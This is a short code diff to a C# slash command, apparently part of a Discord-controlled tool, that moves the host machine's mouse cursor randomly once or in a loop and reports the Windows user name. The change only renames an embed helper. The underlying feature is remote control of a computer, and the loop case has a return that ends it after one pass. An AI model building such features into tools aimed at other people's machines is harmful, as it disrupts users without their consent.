@@ -32,7 +32,7 @@ public class CursorCmd : ISlashCommand
     {
         if (parameters is null)
         {
-            return EmbedCreator.CreateWithText(Color.Red, "Command executed with errors",
+            return DiscordEmbed.CreateWithText(Color.Red, "Command executed with errors",
                 "Incorrect option parameters.", Environment.UserName, null);
         }
 
@@ -42,7 +42,7 @@ public class CursorCmd : ISlashCommand
             case "shoot":
                 MoveCursorAction.Follow();
 
-                return EmbedCreator.CreateWithText(Color.Green, "Command was executed successfully",
+                return DiscordEmbed.CreateWithText(Color.Green, "Command was executed successfully",
                     "Mouse has been moved to random position on the screen.", Environment.UserName, null);
             case "loop":
             {
@@ -53,7 +53,7 @@ public class CursorCmd : ISlashCommand
                     MoveCursorAction.Follow();
                     Thread.Sleep(random.Next(Settings.CursorMinTime, Settings.CursorMaxTime));
 
-                    return EmbedCreator.CreateWithText(Color.Green, "Command was executed successfully",
+                    return DiscordEmbed.CreateWithText(Color.Green, "Command was executed successfully",
                         "Mouse moving loop has been set, working...", Environment.UserName, null);
                 }
 
@@ -61,7 +61,7 @@ public class CursorCmd : ISlashCommand
             }
         }
 
-        return EmbedCreator.CreateWithText(Color.Red, "Command executed with errors",
+        return DiscordEmbed.CreateWithText(Color.Red, "Command executed with errors",
             "Unknown error. Unable to move mouse.", Environment.UserName, null);
     }
 }
